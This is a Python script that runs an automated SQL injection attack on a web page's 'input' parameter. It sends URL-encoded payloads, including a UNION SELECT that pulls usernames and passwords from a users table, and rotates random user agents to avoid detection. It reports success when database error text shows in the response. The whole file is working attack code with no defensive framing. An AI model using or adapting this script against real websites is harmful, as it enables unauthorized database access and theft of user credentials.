import requests
import random
from urllib.parse import quote
from fake_useragent import UserAgent

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def encode_payload(payload):
    return quote(payload)

def sql_injection_attack(url, payloads, session):
    for payload in payloads:
        encoded_payload = encode_payload(payload)
        target_url = f"{url}?input={encoded_payload}"
        headers = {'User-Agent': get_random_user_agent()}
        
        try:
            response = session.get(target_url, headers=headers)
            if "mysql" in response.text.lower() or "error" in response.text.lower():
                print(f"SQL Injection successful at: {target_url} with payload: {payload}")
            else:
                print(f"SQL Injection failed at: {target_url}, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during SQL Injection attack: {e}")

def start_sql_injection(url, session):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND 1=1 --",
        "1' OR '1'='1' --"
    ]
    sql_injection_attack(url, payloads, session)
